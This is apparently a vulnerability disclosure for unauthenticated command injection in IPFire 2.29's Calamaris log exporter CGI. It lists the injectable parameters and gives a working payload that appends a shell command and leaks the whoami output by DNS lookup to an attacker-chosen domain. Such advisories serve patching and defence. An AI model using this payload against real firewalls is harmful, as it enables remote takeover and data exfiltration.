Description:
The Calamaris log exporter CGI (/cgi-bin/logs.cgi/calamaris.dat) in IPFire 2.29 does not properly sanitize user-supplied input before incorporating parameter values into a shell command. An unauthenticated remote attacker can inject arbitrary OS commands by embedding shell metacharacters in any of the following parameters:

# Command Injection

```
https://192.168.124.92:444/cgi-bin/logs.cgi/calamaris.dat
```
- BYTE_UNIT

- DAY_BEGIN

- DAY_END

- HIST_LEVEL

- MONTH_BEGIN

- MONTH_END

- NUM_CONTENT

- NUM_DOMAINS

- NUM_HOSTS

- NUM_URLS

- PERF_INTERVAL

- YEAR_BEGIN

- YEAR_END


The payload:
```
|nslookup $(whoami).<OOB.DOMAIN>.&
```
Needs to be URL encoded,
replace ```<OOB.DOMAIN>``` with your domain.

This payload requires the DNS and Firewall to be configured to reach a public DNS server.

Demo:

![](https://github.com/4rdr/proofs/blob/main/gifs/IPFire-2.29-Command-Injection.gif?raw=true)

